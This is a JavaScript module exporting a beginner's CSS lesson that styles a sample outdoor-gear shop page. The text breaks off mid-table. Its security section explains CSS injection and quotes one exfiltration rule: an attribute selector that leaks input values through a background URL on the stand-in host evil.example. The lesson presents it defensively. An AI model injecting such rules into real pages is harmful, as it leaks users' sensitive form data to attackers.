export default "# Introduction to CSS and Web Styling\r\n\r\n*A four-part lesson. Running example: styling the home page of Harbor Goods, a small online shop that sells outdoor and boating gear.*\r\n\r\n---\r\n\r\n## Part 1 of 4: What CSS Is and How It Works\r\n\r\n### 1.1 What CSS is\r\n\r\n**CSS** (Cascading Style Sheets) is the language that controls how HTML looks: colours, fonts, spacing, layout, and how a page adapts to different screens.\r\n\r\n| Technology | Job | Analogy (a house) |\r\n|---|---|---|\r\n| HTML | Structure and meaning | The frame, walls, and rooms |\r\n| **CSS** | Appearance and layout | Paint, furniture, and arrangement |\r\n| JavaScript | Behaviour | Electricity and moving parts |\r\n\r\nKeeping them separate means you can redesign a whole site by changing one CSS file, without touching the HTML.\r\n\r\n### 1.2 What a CSS rule looks like\r\n\r\n```css\r\nh1 {\r\n  color: #0b3d5c;\r\n  font-size: 2rem;\r\n}\r\n```\r\n\r\n| Part | Example | Meaning |\r\n|---|---|---|\r\n| **Selector** | `h1` | Which elements the rule applies to |\r\n| **Declaration block** | `{ ... }` | The settings, wrapped in curly braces |\r\n| **Declaration** | `color: #0b3d5c;` | One setting: a property and a value |\r\n| **Property** | `color` | What you want to change |\r\n| **Value** | `#0b3d5c` | What you want to change it to |\r\n\r\nRules of the syntax:\r\n\r\n- A property and its value are separated by a **colon**, and each declaration ends with a **semicolon**.\r\n- A missing semicolon or a typo in one declaration can cause the browser to ignore that declaration (and sometimes the next one).\r\n- CSS ignores extra whitespace, so indent for readability.\r\n- Comments are written `/* like this */`.\r\n- Property names and most keywords are not case-sensitive, but write them in lowercase. Class names, IDs, and file paths **are** case-sensitive.\r\n\r\n### 1.3 Three ways to add CSS\r\n\r\n| Method | Example | Use it? |\r\n|---|---|---|\r\n| **External stylesheet** | `<link rel=\"stylesheet\" href=\"css/style.css\">` | **Yes.** The normal approach: one file shared by every page and cached by the browser |\r\n| **Internal style block** | `<style> h1 { color: red; } </style>` in the head | Fine for demos and tiny one-page experiments |\r\n| **Inline style attribute** | `<h1 style=\"color: red;\">` | Avoid. Hard to maintain, very high priority, and awkward with a strict Content Security Policy |\r\n\r\nThe link goes in the `<head>`:\r\n\r\n```html\r\n<head>\r\n  <meta charset=\"utf-8\">\r\n  <title>Harbor Goods</title>\r\n  <link rel=\"stylesheet\" href=\"css/style.css\">\r\n</head>\r\n```\r\n\r\nYou can link several stylesheets. Later rules override earlier ones when they are equally specific.\r\n\r\n### 1.4 How the browser applies CSS\r\n\r\n1. The browser parses the HTML and builds the DOM tree.\r\n2. It parses the CSS and works out which rules match each element.\r\n3. When rules conflict, it resolves them using the **cascade** (Part 2).\r\n4. It calculates the final size and position of every box (**layout**).\r\n5. It draws the result on the screen (**paint**).\r\n\r\nStylesheets in the head are **render-blocking**: the browser waits for them so it does not show an unstyled page that suddenly changes. Keep them small and put them in the head.\r\n\r\n### 1.5 Selectors: choosing what to style\r\n\r\n| Selector | Example | Matches |\r\n|---|---|---|\r\n| **Element (type)** | `p` | Every `<p>` |\r\n| **Class** | `.card` | Elements with `class=\"card\"` |\r\n| **ID** | `#logo` | The element with `id=\"logo\"` (use sparingly for styling) |\r\n| **Universal** | `*` | Every element |\r\n| **Group** | `h1, h2, h3` | Any of them |\r\n| **Descendant** | `nav a` | Links anywhere inside a `<nav>` |\r\n| **Child** | `ul > li` | `<li>` elements that are **direct** children of a `<ul>` |\r\n| **Adjacent sibling** | `h2 + p` | A `<p>` immediately after an `<h2>` |\r\n| **General sibling** | `h2 ~ p` | Every `<p>` after an `<h2>` (same parent) |\r\n| **Attribute** | `a[target=\"_blank\"]` | Links with that attribute |\r\n| **Attribute (starts with)** | `a[href^=\"https\"]` | Links whose `href` starts with `https` |\r\n| **Attribute (ends with)** | `a[href$=\".pdf\"]` | Links ending in `.pdf` |\r\n| **Pseudo-class** | `a:hover`, `li:first-child`, `input:invalid` | Elements in a particular **state** or position |\r\n| **Pseudo-element** | `p::first-line`, `.note::before` | A **part** of an element, or generated content |\r\n| **Combined** | `.card.featured` | An element with **both** classes (no space) |\r\n\r\nUseful pseudo-classes:\r\n\r\n| Pseudo-class | When it applies |\r\n|---|---|\r\n| `:hover` | The pointer is over the element |\r\n| `:focus` and `:focus-visible` | The element has keyboard focus (`:focus-visible` shows only when the browser decides a focus ring is helpful) |\r\n| `:active` | The element is being pressed |\r\n| `:visited` | A link the user has visited (very limited styling allowed, for privacy) |\r\n| `:first-child`, `:last-child`, `:nth-child(2n)` | Position among siblings |\r\n| `:not(.hidden)` | Elements that do **not** match |\r\n| `:required`, `:invalid`, `:disabled`, `:checked` | Form states |\r\n\r\nPrefer **classes** for styling. They are reusable, easy to read, and have predictable priority.\r\n\r\n### 1.6 Naming classes well\r\n\r\n| Practice | Example |\r\n|---|---|\r\n| Describe the **purpose**, not the look | `.warning`, not `.red-box` |\r\n| Use lowercase with hyphens | `.product-card` |\r\n| Keep names short but meaningful | `.price` |\r\n| Stay consistent across the project | Use one naming style throughout |\r\n| Avoid starting with a digit or using spaces | Invalid |\r\n\r\nA popular convention is **BEM** (Block, Element, Modifier), such as `.card`, `.card__title`, `.card--featured`. You do not have to use it, but being consistent matters.\r\n\r\n**Part 1 summary.** You can explain what CSS does, read and write a rule, add CSS in three ways (and choose the external file), describe how the browser applies styles, and use the main selectors, pseudo-classes, and naming habits.\r\n\r\n---\r\n\r\n## Part 2 of 4: The Core of CSS\r\n\r\n### 2.1 The cascade, specificity, and inheritance\r\n\r\nWhen several rules target the same element and set the same property, CSS must choose a winner. It checks, roughly in this order:\r\n\r\n1. **Importance and origin:** `!important` declarations beat normal ones; your styles beat the browser's defaults.\r\n2. **Specificity:** the more specific selector wins.\r\n3. **Source order:** if specificity is equal, the **later** rule wins.\r\n\r\n(Modern CSS also has `@layer` for explicit control of order, which you can learn later.)\r\n\r\n**Specificity**, from strongest to weakest:\r\n\r\n| Kind of selector | Strength | Example |\r\n|---|---|---|\r\n| Inline `style=\"...\"` | Highest | `<p style=\"color: red\">` |\r\n| ID | Very strong | `#logo` |\r\n| Class, attribute, pseudo-class | Medium | `.card`, `[type=\"email\"]`, `:hover` |\r\n| Element, pseudo-element | Weak | `p`, `::before` |\r\n| Universal `*`, combinators | None | `*`, `>`, `+` |\r\n\r\nWorked example:\r\n\r\n```html\r\n<p id=\"note\" class=\"alert\">Check your fit.</p>\r\n```\r\n\r\n```css\r\np        { color: black; }    /* element:  weakest  */\r\n.alert   { color: orange; }   /* class:    stronger */\r\n#note    { color: red; }      /* ID:       stronger still -> wins */\r\n```\r\n\r\nThe text is red, because the ID selector beats the class and element selectors, no matter what order they are written in.\r\n\r\nGood habits:\r\n\r\n- Keep selectors **simple and low in specificity** (mostly single classes).\r\n- Avoid IDs for styling, and avoid long chains like `body div.main ul li a`.\r\n- Avoid `!important`. It makes later fixes painful. Use it only as a last resort (for example, overriding third-party styles you cannot change).\r\n- If a rule \"is not working\", it is almost always being overridden by something more specific, or a typo.\r\n\r\n**Inheritance:** some properties pass from parent to child automatically, and others do not.\r\n\r\n| Inherited (usually) | Not inherited (usually) |\r\n|---|---|\r\n| `color`, `font-family`, `font-size`, `line-height`, `text-align`, `visibility` | `margin`, `padding`, `border`, `background`, `width`, `height`, `display` |\r\n\r\nSo setting `font-family` on `body` styles nearly all text, but setting a `border` on `body` does not draw borders around everything inside it. You can force the behaviour with keywords: `inherit`, `initial`, `unset`, and `revert`.\r\n\r\n### 2.2 Colour\r\n\r\n| Format | Example | Notes |\r\n|---|---|---|\r\n| Named | `tomato`, `navy`, `white` | About 140 names |\r\n| Hex | `#0b3d5c`, `#fff` | Red, green, blue as hex pairs; short form when pairs repeat |\r\n| Hex with opacity | `#0b3d5c80` | Last two digits are alpha |\r\n| `rgb()` | `rgb(11 61 92)`, `rgb(11 61 92 / 0.5)` | Red, green, blue (0 to 255), optional alpha |\r\n| `hsl()` | `hsl(203 78% 20%)` | Hue (0 to 360), saturation, lightness; handy for building palettes |\r\n| `currentColor` | `border-color: currentColor;` | Uses the element's current text colour |\r\n| `transparent` | `background: transparent;` | Fully see-through |\r\n\r\nColour properties you will use constantly:\r\n\r\n| Property | Controls |\r\n|---|---|\r\n| `color` | Text colour |\r\n| `background-color` | Background colour |\r\n| `border-color` | Border colour |\r\n| `opacity` | Transparency of the **whole element** (including its content) |\r\n| `accent-color` | Colour of checkboxes, radios, and range sliders |\r\n\r\n**Colour and accessibility:**\r\n\r\n| Rule | Detail |\r\n|---|---|\r\n| Contrast ratio | Normal text needs at least **4.5:1** against its background; large text (about 24px, or 19px bold) needs at least **3:1** (WCAG AA) |\r\n| Do not rely on colour alone | Errors and links also need text, an icon, or an underline |\r\n| Check both light and dark themes | A colour that works on white may fail on black |\r\n| Test | Use the browser's colour picker in developer tools, which shows the contrast ratio |\r\n\r\n### 2.3 Units\r\n\r\n| Unit | Type | Meaning | Best for |\r\n|---|---|---|---|\r\n| `px` | Absolute | One CSS pixel | Borders, shadows, fine details |\r\n| `rem` | Relative | Multiple of the **root** font size (usually 16px) | Font sizes, spacing, most layout |\r\n| `em` | Relative | Multiple of the **element's own** (or parent's) font size | Spacing tied to text size |\r\n| `%` | Relative | Percentage of the parent's matching size | Fluid widths |\r\n| `vw`, `vh` | Relative | 1% of the viewport width or height | Full-screen sections |\r\n| `dvh` | Relative | Viewport height that adjusts for mobile browser bars | Mobile full-height layouts |\r\n| `ch` | Relative | Width of the \"0\" character | Readable line lengths (`65ch`) |\r\n| `fr` | Grid-only | A share of the free space in a grid | Grid columns |\r\n| `calc()` | Function | Mixes units: `calc(100% - 2rem)` | Combining sizes |\r\n\r\nWhy `rem` for text: users can set their preferred text size in the browser, and `rem` respects it, while fixed pixel sizes may not. Use `rem` for fonts and spacing so your page scales for everyone.\r\n\r\nZero needs no unit (`margin: 0`). Never write a unit-less number for lengths (except `line-height`, which is usually unitless, like `1.6`).\r\n\r\n### 2.4 Text and fonts\r\n\r\n| Property | Purpose | Example |\r\n|---|---|---|\r\n| `font-family` | The typeface, with fallbacks | `font-family: system-ui, \"Segoe UI\", Roboto, sans-serif;` |\r\n| `font-size` | Size | `font-size: 1rem;` |\r\n| `font-weight` | Boldness | `400` (normal), `700` (bold) |\r\n| `font-style` | Italic | `italic` |\r\n| `line-height` | Spacing between lines | `1.6` (unitless) |\r\n| `letter-spacing`, `word-spacing` | Spacing between characters and words | `0.02em` |\r\n| `text-align` | Alignment | `left`, `center`, `right` |\r\n| `text-decoration` | Underline, strike-through | `underline`, `none` |\r\n| `text-transform` | Capitalisation (without changing the source text) | `uppercase` |\r\n| `text-indent` | First-line indent | `1.5em` |\r\n| `white-space` | Control wrapping and spaces | `nowrap`, `pre-wrap` |\r\n| `max-width` with `ch` | Comfortable line length | `max-width: 65ch;` |\r\n| `text-wrap` | Nicer wrapping (modern browsers) | `balance` for headings |\r\n\r\n**The font stack:** always list fallbacks, ending in a generic family (`serif`, `sans-serif`, `monospace`, `system-ui`).\r\n\r\n```css\r\nbody {\r\n  font-family: system-ui, -apple-system, \"Segoe UI\", Roboto, \"Helvetica Neue\", Arial, sans-serif;\r\n  line-height: 1.6;\r\n}\r\n```\r\n\r\nSystem fonts load instantly and look native on every device. To use a custom font, load it with `@font-face`:\r\n\r\n```css\r\n@font-face {\r\n  font-family: \"Harbor Sans\";\r\n  src: url(\"../fonts/harbor-sans.woff2\") format(\"woff2\");\r\n  font-weight: 400;\r\n  font-display: swap;   /* show fallback text immediately, swap when the font loads */\r\n}\r\n\r\nbody { font-family: \"Harbor Sans\", system-ui, sans-serif; }\r\n```\r\n\r\nCheck the font's licence, use the compact `woff2` format, and load only the weights you need. Every extra font slows the page.\r\n\r\n### 2.5 The box model\r\n\r\nEvery element is a rectangular box with four layers.\r\n\r\n```text\r\n+--------------------------------+\r\n|             margin             |   outside space between boxes\r\n|   +------------------------+   |\r\n|   |         border         |   |   the edge\r\n|   |   +----------------+   |   |\r\n|   |   |    padding     |   |   |   space inside, around the content\r\n|   |   |   [ content ]  |   |   |   text, images, children\r\n|   |   +----------------+   |   |\r\n|   +------------------------+   |\r\n+--------------------------------+\r\n```\r\n\r\n| Layer | Property | Notes |\r\n|---|---|---|\r\n| Content | `width`, `height` | The inner area |\r\n| Padding | `padding` | Space **inside** the border; takes the element's background |\r\n| Border | `border` | `border: 1px solid #ccc;` |\r\n| Margin | `margin` | Space **outside**; always transparent |\r\n\r\n**Shorthand** for four-sided properties (`margin`, `padding`, `border-width`):\r\n\r\n| Written | Means |\r\n|---|---|\r\n| `padding: 1rem;` | All four sides |\r\n| `padding: 1rem 2rem;` | Top and bottom `1rem`; left and right `2rem` |\r\n| `padding: 1rem 2rem 3rem;` | Top; left and right; bottom |\r\n| `padding: 1rem 2rem 3rem 4rem;` | Top, right, bottom, left (**clockwise** from the top) |\r\n\r\n**The sizing trap and its fix.** By default (`content-box`), `width` sets only the **content** width, so padding and borders are **added** on top, and boxes end up wider than you expect. Setting `box-sizing: border-box` makes `width` include padding and border, which is far more predictable. Almost every project starts with:\r\n\r\n```css\r\n*, *::before, *::after {\r\n  box-sizing: border-box;\r\n}\r\n```\r\n\r\nOther box facts:\r\n\r\n- **Margin collapsing:** the vertical margins of adjacent block elements merge into the larger one (not the sum). Horizontal margins do not collapse.\r\n- `margin: 0 auto` centres a block that has a set `width` or `max-width`.\r\n- `max-width` stops a box getting too wide and, unlike `width`, lets it shrink on small screens.\r\n- `border-radius` rounds corners (`50%` makes a circle from a square).\r\n- `box-shadow` adds a shadow: `box-shadow: 0 2px 6px rgb(0 0 0 / 0.15);`\r\n- `overflow` controls what happens when content is too big: `visible`, `hidden`, `auto`, `scroll`.\r\n- `outline` draws a line outside the border and does not affect layout (used for focus rings).\r\n\r\n### 2.6 Display: block, inline, and more\r\n\r\n| Value | Behaviour | Typical elements |\r\n|---|---|---|\r\n| `block` | Starts on a new line, fills the available width, accepts width and height | `<div>`, `<p>`, `<h1>`, `<section>` |\r\n| `inline` | Flows within a line; ignores width and height; only horizontal margin and padding affect layout | `<a>`, `<strong>`, `<span>` |\r\n| `inline-block` | Flows inline but accepts width and height | Buttons, inputs |\r\n| `flex` | A flexible one-dimensional layout container | You choose it |\r\n| `grid` | A two-dimensional layout container | You choose it |\r\n| `none` | Removed from the page (and from assistive technology) | Hide something completely |\r\n\r\n`visibility: hidden` hides an element but keeps its space. For content that must be hidden from the screen but still read by screen readers, use a \"visually hidden\" utility class (a technique with `clip` and `position: absolute`), not `display: none`.\r\n\r\n### 2.7 Backgrounds and borders\r\n\r\n```css\r\n.hero {\r\n  background-color: #0b3d5c;\r\n  background-image: linear-gradient(135deg, #0b3d5c, #1d6f9f);\r\n  background-size: cover;\r\n  background-position: center;\r\n  color: #fff;\r\n  border-radius: 0.75rem;\r\n}\r\n```\r\n\r\n| Property | Purpose |\r\n|---|---|\r\n| `background-color` | Solid colour |\r\n| `background-image` | `url(\"...\")` or a gradient |\r\n| `background-size` | `cover` (fill, may crop), `contain` (fit inside) |\r\n| `background-position` | Where the image sits |\r\n| `background-repeat` | `no-repeat`, `repeat-x`, and so on |\r\n| `background` | Shorthand for the above |\r\n| `border` | Shorthand: width, style, colour |\r\n| `border-bottom`, `border-left`, and so on | One side only |\r\n\r\nDo not use a CSS `background-image` for **meaningful** pictures, because it has no alt text. Use `<img>` for content and CSS backgrounds for decoration.\r\n\r\n### 2.8 CSS variables (custom properties)\r\n\r\nVariables let you define a value once and reuse it everywhere.\r\n\r\n```css\r\n:root {\r\n  --blue: #0b3d5c;\r\n  --light: #f4f8fb;\r\n  --space: 1rem;\r\n  --radius: 0.5rem;\r\n}\r\n\r\n.card {\r\n  background: #fff;\r\n  padding: var(--space);\r\n  border-radius: var(--radius);\r\n  border: 1px solid var(--blue);\r\n}\r\n```\r\n\r\n| Fact | Detail |\r\n|---|---|\r\n| Names | Start with two hyphens: `--blue` |\r\n| Use | `var(--blue)`, with an optional fallback: `var(--blue, navy)` |\r\n| Scope | Defined on `:root` they are global; defined on another selector they apply to that element and its children |\r\n| Live | They can be changed at runtime and with media queries (used for dark mode) |\r\n\r\nChanging the colour scheme of a whole site then means editing one line.\r\n\r\n### 2.9 Comments and organisation\r\n\r\nA tidy stylesheet follows a predictable order:\r\n\r\n1. Variables (`:root`)\r\n2. Reset and base rules (`*`, `body`, headings, links, images)\r\n3. Layout (header, main, footer, grids)\r\n4. Components (buttons, cards, forms)\r\n5. Utilities and helpers\r\n6. Media queries and preferences (dark mode, reduced motion)\r\n\r\n```css\r\n/* ========== Base ========== */\r\n/* ========== Components: card ========== */\r\n```\r\n\r\n**Part 2 summary.** You can explain the cascade, specificity, and inheritance, use colours, units, and fonts, apply the box model with `border-box`, choose `display` values, add backgrounds and borders, use CSS variables, and organise a stylesheet.\r\n\r\n---\r\n\r\n## Part 3 of 4: Layout, Responsiveness, Polish, and Safety\r\n\r\n### 3.1 Flexbox: one-dimensional layout\r\n\r\nFlexbox lines items up in a row or a column. You apply `display: flex` to the **parent** (the \"container\"); its children become \"flex items\".\r\n\r\n```css\r\n.nav-list {\r\n  display: flex;\r\n  gap: 1rem;\r\n  list-style: none;\r\n  padding: 0;\r\n  margin: 0;\r\n}\r\n```\r\n\r\n| Container property | Purpose | Common values |\r\n|---|---|---|\r\n| `display: flex` | Turns on flexbox | |\r\n| `flex-direction` | Main axis direction | `row` (default), `column` |\r\n| `justify-content` | Alignment along the **main** axis | `flex-start`, `center`, `space-between`, `space-around`, `flex-end` |\r\n| `align-items` | Alignment along the **cross** axis | `stretch` (default), `center`, `flex-start` |\r\n| `flex-wrap` | Allow wrapping onto new lines | `nowrap` (default), `wrap` |\r\n| `gap` | Space between items | `1rem` |\r\n\r\n| Item property | Purpose |\r\n|---|---|\r\n| `flex: 1` | Grow to share the free space equally |\r\n| `flex-grow`, `flex-shrink`, `flex-basis` | Detailed control of growing, shrinking, and starting size |\r\n| `align-self` | Override the cross-axis alignment for one item |\r\n| `order` | Change visual order (take care: it does not change the reading or tab order, which can confuse keyboard and screen reader users) |\r\n\r\nClassic uses: a navigation bar, centring something both ways, a row of buttons, a header with a logo on the left and links on the right.\r\n\r\n```css\r\n.site-header {\r\n  display: flex;\r\n  justify-content: space-between;\r\n  align-items: center;\r\n  flex-wrap: wrap;\r\n  gap: 1rem;\r\n}\r\n```\r\n\r\n### 3.2 Grid: two-dimensional layout\r\n\r\nGrid lays items out in rows **and** columns.\r\n\r\n```css\r\n.card-grid {\r\n  display: grid;\r\n  grid-template-columns: repeat(auto-fit, minmax(14rem, 1fr));\r\n  gap: 1rem;\r\n}\r\n```\r\n\r\nThis one line makes a **responsive** grid: as many columns of at least `14rem` as fit, sharing the leftover space equally, with no media query needed.\r\n\r\n| Property | Purpose |\r\n|---|---|\r\n| `display: grid` | Turns on grid |\r\n| `grid-template-columns` | Defines the columns (`1fr 2fr`, `repeat(3, 1fr)`) |\r\n| `grid-template-rows` | Defines rows (often left automatic) |\r\n| `gap` | Space between rows and columns |\r\n| `grid-column`, `grid-row` | Place an item across lines (`grid-column: 1 / -1` spans every column) |\r\n| `grid-template-areas` | Name regions of the layout (`\"header header\" \"nav main\"`) |\r\n| `place-items` | Shorthand for centring items in their cells |\r\n\r\n| Choose | When |\r\n|---|---|\r\n| **Flexbox** | One direction: a row of links, a toolbar, centring a single item |\r\n| **Grid** | Two directions: page layouts, card grids, dashboards |\r\n| **Both together** | Common: grid for the page, flexbox inside each component |\r\n\r\nDo not use tables, floats, or position hacks for layout. Those are old techniques.\r\n\r\n### 3.3 Positioning\r\n\r\n| `position` | Behaviour |\r\n|---|---|\r\n| `static` | Normal flow (the default) |\r\n| `relative` | Normal flow, but can be nudged with `top`, `left`, and so on; also becomes the reference point for absolute children |\r\n| `absolute` | Removed from the flow; positioned relative to the nearest positioned ancestor |\r\n| `fixed` | Fixed to the viewport (for example a sticky bar that stays on screen) |\r\n| `sticky` | Scrolls normally, then sticks at a set offset (`top: 0`) |\r\n\r\nUse positioning sparingly for small adjustments and overlays, and use flex or grid for layout. `z-index` controls stacking order for positioned elements.\r\n\r\n### 3.4 Responsive design\r\n\r\nA **responsive** page adapts to any screen size.\r\n\r\n| Ingredient | How |\r\n|---|---|\r\n| The viewport meta tag | `<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">` in the HTML head |\r\n| Flexible layouts | Flex, grid, percentages, and `max-width`, not fixed pixel widths |\r\n| Flexible images | `img { max-width: 100%; height: auto; }` |\r\n| **Media queries** | Apply rules only when a condition is true |\r\n| Relative units | `rem`, `em`, `%`, `ch`, `vw` |\r\n\r\n**Mobile first:** write the small-screen styles as the default, then add rules for larger screens with `min-width`.\r\n\r\n```css\r\n.layout { display: block; }\r\n\r\n@media (min-width: 48rem) {\r\n  .layout {\r\n    display: grid;\r\n    grid-template-columns: 2fr 1fr;\r\n    gap: 2rem;\r\n  }\r\n}\r\n```\r\n\r\nChoose breakpoints where **your content** starts to look bad, not for specific devices. Common starting points are about `40rem`, `48rem`, and `64rem`.\r\n\r\nMedia queries can also respond to **user preferences**:\r\n\r\n| Query | Meaning |\r\n|---|---|\r\n| `(prefers-color-scheme: dark)` | The user prefers dark mode |\r\n| `(prefers-reduced-motion: reduce)` | The user wants less animation |\r\n| `(prefers-contrast: more)` | The user wants higher contrast |\r\n| `print` | Styles for printing |\r\n| `(hover: hover)` | The device has a real hover (not a touchscreen) |\r\n\r\n```css\r\n@media (prefers-color-scheme: dark) {\r\n  :root {\r\n    --light: #101820;\r\n    --text: #eef3f6;\r\n  }\r\n}\r\n```\r\n\r\nModern CSS also has **container queries** (`@container`) to style a component based on its parent's size, and `clamp()` for fluid sizes, such as `font-size: clamp(1.5rem, 4vw, 2.5rem);`. You can explore those once the basics feel comfortable.\r\n\r\n### 3.4a Responsive images\r\n\r\n```css\r\nimg {\r\n  max-width: 100%;\r\n  height: auto;\r\n  display: block;\r\n}\r\n```\r\n\r\nKeep `width` and `height` attributes in the HTML so the browser reserves space and the page does not jump while the image loads.\r\n\r\n### 3.5 Interaction states and transitions\r\n\r\nStyle every interactive element's states: normal, hover, focus, active, and disabled.\r\n\r\n```css\r\n.button {\r\n  display: inline-block;\r\n  background: var(--blue);\r\n  color: #fff;\r\n  padding: 0.6rem 1.2rem;\r\n  border-radius: var(--radius);\r\n  text-decoration: none;\r\n  transition: background-color 0.2s ease, transform 0.2s ease;\r\n}\r\n\r\n.button:hover { background: #135680; }\r\n.button:active { transform: translateY(1px); }\r\n\r\n.button:focus-visible {\r\n  outline: 3px solid #f2a900;\r\n  outline-offset: 2px;\r\n}\r\n```\r\n\r\n| Concept | Notes |\r\n|---|---|\r\n| `transition` | Smoothly animates a property change: property, duration, timing function |\r\n| `transform` | Move, scale, or rotate without affecting layout (`translate`, `scale`, `rotate`) |\r\n| `@keyframes` and `animation` | Multi-step animations |\r\n| Animate cheap properties | `transform` and `opacity` are the smoothest; avoid animating `width`, `height`, or `top` |\r\n| Respect motion preferences | Turn animations off for users who ask |\r\n\r\n```css\r\n@media (prefers-reduced-motion: reduce) {\r\n  * {\r\n    animation: none !important;\r\n    transition: none !important;\r\n  }\r\n}\r\n```\r\n\r\nDo not rely on hover alone for important information, because touch screens have no hover.\r\n\r\n### 3.6 Accessibility in CSS\r\n\r\n| Practice | Why |\r\n|---|---|\r\n| **Never remove the focus outline** (`outline: none`) without giving a clear replacement | Keyboard users need to see where they are |\r\n| Use `:focus-visible` for focus rings | Shows for keyboard focus without annoying mouse users |\r\n| Keep contrast at 4.5:1 for text (3:1 for large text and for UI components) | Readability for low vision and bright light |\r\n| Do not use colour alone to convey meaning | Colour-blind users need text, icons, or patterns |\r\n| Use `rem` for text, and test at 200% zoom | Respect user font settings; avoid clipped or overlapping content |\r\n| Leave links recognisable (underline or another clear cue) | People must find them |\r\n| Make touch targets large enough (about 44 by 44 CSS pixels) | Easier for fingers and motor impairments |\r\n| Keep visual order matching source order (careful with `order` and grid placement) | Keyboard and screen reader order follow the HTML |\r\n| Avoid `display: none` for content that screen readers should read | It removes the element from assistive technology |\r\n| Use `line-height` of about 1.5 and enough paragraph spacing | Readability for dyslexia and low vision |\r\n| Respect `prefers-reduced-motion`, `prefers-color-scheme`, and `prefers-contrast` | Honours user settings |\r\n| Do not put essential text inside CSS `content` | Support for generated content varies, and it may not be read or selectable |\r\n\r\nA skip link, hidden until focused, is a classic CSS accessibility pattern:\r\n\r\n```css\r\n.skip {\r\n  position: absolute;\r\n  left: -999px;\r\n}\r\n.skip:focus {\r\n  left: 1rem;\r\n  top: 1rem;\r\n  background: #fff;\r\n  color: #000;\r\n  padding: 0.5rem 1rem;\r\n  z-index: 10;\r\n}\r\n```\r\n\r\n### 3.7 Performance\r\n\r\n| Practice | Benefit |\r\n|---|---|\r\n| One small external stylesheet, cached across pages | Fewer downloads |\r\n| Remove unused rules, and minify for production | Smaller files |\r\n| Avoid `@import` inside CSS | It creates a chain of downloads; use multiple `<link>` tags instead |\r\n| Use system fonts, or a few `woff2` fonts with `font-display: swap` | Faster text rendering |\r\n| Animate `transform` and `opacity` only | Smooth, low-cost animation |\r\n| Keep selectors simple | Easier to read; browsers match them quickly enough |\r\n| Avoid huge background images; compress and size them properly | Less data |\r\n| Put critical styles first, and non-critical (such as print) behind `media` attributes: `<link rel=\"stylesheet\" href=\"print.css\" media=\"print\">` | Non-matching stylesheets do not block rendering |\r\n\r\n### 3.8 Security\r\n\r\nCSS looks harmless, but it can be abused.\r\n\r\n| Risk | How it happens | Safer habit |\r\n|---|---|---|\r\n| **CSS injection** | User-supplied text ends up in a `<style>` block or `style` attribute, letting an attacker restyle the page (fake buttons, hidden warnings) or even leak data | Never insert untrusted input into CSS; escape and validate; allow only a fixed list of values (for example, a theme name chosen from a set) |\r\n| **Data leakage through attribute selectors** | An attacker who can inject CSS can use rules like `input[value^=\"a\"] { background: url(https://evil.example/?a) }` to learn sensitive values from the requests the browser makes | Content Security Policy that limits `style-src` and `img-src`; do not render secrets into attributes |\r\n| **Untrusted third-party stylesheets and fonts** | An external stylesheet can change your page at will and see who loads it | Host your own, or use trusted providers; pin the version; add `integrity` (Subresource Integrity) with `crossorigin=\"anonymous\"` where offered |\r\n| **Inline styles block a strict CSP** | `style=\"...\"` and unnecessary `<style>` blocks require `'unsafe-inline'` | Keep styles in external files; use classes |\r\n| **`url()` and `@import` with untrusted paths** | Can send requests to attacker-controlled servers | Validate any URLs; avoid building them from user input |\r\n| **Clickjacking and UI deception** | Another site frames yours and overlays invisible elements | Send `X-Frame-Options` or CSP `frame-ancestors` from the **server**; do not rely on CSS |\r\n| **Hiding warnings with CSS** | A compromised page can hide security messages | Do not rely on CSS alone for critical security UI |\r\n| **Privacy and tracking** | `:visited` styling was once used to sniff browsing history | Browsers now restrict `:visited` styling; do not try to work around it |\r\n| **Content you cannot trust in `content:`** | Generated text is not read reliably | Put real content in the HTML |\r\n\r\nKeep user-provided \"styling\" to safe, validated values:\r\n\r\n```javascript\r\n// Allow only known themes; never put raw user text into CSS\r\nconst allowed = [\"light\", \"dark\", \"high-contrast\"];\r\nconst theme = allowed.includes(userChoice) ? userChoice : \"light\";\r\ndocument.documentElement.dataset.theme = theme;   // CSS targets [data-theme=\"dark\"]\r\n```\r\n\r\n### 3.9 Debugging CSS with browser developer tools\r\n\r\nPress `F12`, or right-click an element and choose **Inspect**.\r\n\r\n| Panel or feature | What it shows |\r\n|---|---|\r\n| **Elements** | The live DOM; click any element to select it |\r\n| **Styles** | Every rule that applies to the selected element, with the winning declarations; **overridden ones are crossed out** |\r\n| **Computed** | The final value of every property, and which rule it came from |\r\n| **Box model diagram** | Margin, border, padding, and content sizes at a glance |\r\n| **Editing live** | Click a value, change it, and see the page update (changes vanish on refresh) |\r\n| **Toggle a declaration** | Untick the box beside it to turn it off |\r\n| **Device mode** | Test phone and tablet widths |\r\n| **Layout / Flex and Grid overlays** | Show flex and grid lines on the page |\r\n| **Rendering tab** | Emulate dark mode, reduced motion, and print |\r\n| **Lighthouse** | Audits accessibility, performance, and best practice |\r\n\r\nTypical problems:\r\n\r\n| Problem | Likely cause |\r\n|---|---|\r\n| A rule has no effect | It is crossed out in **Styles** (overridden); the selector does not match (typo, wrong class); the property is not valid for that element; a syntax error above it |\r\n| The element is not where you expect | Margin collapsing, `display` mismatch, or `box-sizing` surprises |\r\n| A width does nothing on a `<span>` or `<a>` | They are inline; set `display: inline-block` or `block` |\r\n| `margin: auto` does not centre | The element has no set `width` or `max-width`, or is not a block |\r\n| Everything shifted after adding a border or padding | `content-box` sizing; use `border-box` |\r\n| Text overflows its box | Long words or fixed widths; use `overflow-wrap`, flexible widths |\r\n| Layout breaks on mobile | Missing viewport meta tag, fixed pixel widths, or no media queries |\r\n| The file does not seem to load | Wrong `href` path, or a 404 in the **Network** tab |\r\n| Old styles keep showing | The browser cached the file; do a hard refresh (`Ctrl + F5`) |\r\n| Colours look wrong | Typo in a hex code, or missing `#` |\r\n\r\nYou can also check your CSS with the W3C CSS Validator at `jigsaw.w3.org/css-validator`.\r\n\r\n### 3.10 Common mistakes\r\n\r\n| Mistake | Better approach |\r\n|---|---|\r\n| Missing semicolons or braces | Format neatly and use an editor that highlights errors |\r\n| Styling everything with IDs | Use classes |\r\n| Overusing `!important` | Fix the specificity problem instead |\r\n| Long, nested selectors | Short, flat class selectors |\r\n| Fixed pixel widths and heights everywhere | Flexible units, `max-width`, and `min-height` |\r\n| Forgetting `box-sizing: border-box` | Add the reset at the top |\r\n| Using tables or floats for layout | Flexbox and grid |\r\n| `outline: none` with no replacement | Style `:focus-visible` clearly |\r\n| Low-contrast text | Check ratios (4.5:1) |\r\n| Fonts set only in `px` | Use `rem` |\r\n| Missing font fallbacks | List a full font stack |\r\n| Inline `style` attributes everywhere | External stylesheet with classes |\r\n| Copying CSS without understanding it | Read each line; look up unfamiliar 